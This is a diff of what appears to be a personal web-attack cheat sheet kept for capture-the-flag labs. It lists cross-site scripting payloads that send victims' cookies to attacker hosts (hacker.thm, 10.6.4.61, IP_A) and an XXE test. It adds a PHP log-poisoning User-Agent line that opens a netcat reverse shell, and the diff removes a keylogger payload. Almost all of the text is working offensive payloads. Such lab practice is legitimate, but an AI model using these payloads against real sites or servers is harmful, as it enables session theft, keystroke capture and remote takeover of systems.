@@ -4,35 +4,14 @@
 <script>alert('XSS');</script>
 <script>user.changeEmail('attacker@hacker.thm');</script>
 
-session stealing:
+# session stealing:
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
 
-key logger:
-<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+# reflected xss
+<script>var i=new Image;i.src="http://10.6.4.61:8888/?"+document.cookie;</script>
 
 # cookie stealing
 < img src=RECURSO onerror=this.src='http://IP_A/?cookies='+btoa(document.cookie) />
-
-# source code links checker (browser dev console)
-browser dev console:
-var x = document.querySelectorAll("a");
-var myarray = []
-for (var i=0; i<x.length; i++){
-var nametext = x[i].textContent;
-var cleantext = nametext.replace(/\s+/g, ' ').trim();
-var cleanlink = x[i].href;
-myarray.push([cleantext,cleanlink]);
-};
-function make_table() {
-    var table = '<table><thead><th>Name</th><th>Links</th></thead><tbody>';
-   for (var i=0; i<myarray.length; i++) {
-            table += '<tr><td>'+ myarray[i][0] + '</td><td>'+myarray[i][1]+'</td></tr>';
-    };
- 
-    var w = window.open("");
-w.document.write(table); 
-}
-make_table()
 
 # XXE testing:
 !--?xml version="1.0" ?-->
@@ -52,3 +31,5 @@ make_table()
     <markdown>Example Markdown></markdown>
 </post>
 
+# burp log poisoning:
+User-Agent: <?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.4.61 4444 >/tmp/f') ?>
